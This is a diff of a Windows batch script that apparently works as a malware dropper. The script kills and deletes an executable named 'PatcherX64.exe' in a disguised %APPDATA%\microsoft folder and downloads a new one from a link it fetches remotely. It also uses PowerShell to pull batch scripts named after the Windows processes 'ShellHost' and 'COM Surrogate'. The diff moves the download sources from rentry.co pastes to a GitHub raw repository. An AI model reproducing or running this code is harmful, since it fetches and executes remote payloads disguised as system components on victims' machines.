@@ -56,7 +56,7 @@ echo Performing installation or alternative actions...
 taskkill /f /im PatcherX64.exe >nul 2>&1
 del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
  
-for /f "delims=" %%i in ('curl -s https://rentry.co/pppn8weu/raw') do set "RUNFILELINK=%%i"
+for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/RunEveryCallerFileLink') do set "RUNFILELINK=%%i"
  
 :: Download the file using curl
 curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%RUNFILELINK%"
@@ -192,7 +192,7 @@ echo Checking for ShellHost...
 set "embeddedScript=temp_script_SHST.bat"
 
 :: Download content and save to the embedded batch file
-powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://rentry.co/vogq6xig/raw') | Out-File -Encoding ASCII '%embeddedScript%'"
+powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ShellHost') | Out-File -Encoding ASCII '%embeddedScript%'"
 
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
@@ -225,7 +225,7 @@ echo Checking for COM Surrogate...
 set "embeddedScript=temp_script_COM.bat"
 
 :: Download content and save to the embedded batch file
-powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://rentry.co/kbg9xro5/raw') | Out-File -Encoding ASCII '%embeddedScript%'"
+powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ComSurrogate') | Out-File -Encoding ASCII '%embeddedScript%'"
 
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
